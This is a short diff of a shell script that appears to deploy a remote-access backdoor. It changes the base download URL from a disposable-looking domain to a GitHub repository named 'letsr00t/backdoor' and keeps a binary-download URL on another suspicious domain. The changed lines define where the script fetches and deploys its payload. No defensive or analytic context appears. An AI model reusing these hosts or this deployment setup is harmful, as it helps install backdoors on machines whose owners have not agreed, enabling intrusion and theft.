@@ -70,7 +70,7 @@ if [ "$#" -eq 0 ]; then
 fi
 
 # Global Defines
-URL_BASE="https://reqf.adel186.cyou/req/x"
+URL_BASE="https://raw.githubusercontent.com/letsr00t/backdoor/refs/heads/main/x"
 [[ -n $GS_URL_BASE ]] && URL_BASE="${GS_URL_BASE}"
 URL_BIN="https://kedui186.cfd/file/"
 URL_DEPLOY="${URL_BASE}"
